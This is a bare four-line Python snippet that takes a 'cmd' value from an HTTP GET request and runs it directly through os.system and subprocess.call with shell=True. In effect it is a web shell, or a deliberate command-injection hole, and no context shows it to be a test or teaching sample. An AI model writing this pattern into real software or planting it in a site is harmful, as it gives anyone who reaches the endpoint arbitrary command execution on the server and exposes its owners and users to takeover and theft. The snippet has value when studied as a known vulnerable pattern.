
import os, subprocess
cmd = request.GET.get('cmd')
os.system(cmd)
subprocess.call(cmd, shell=True)
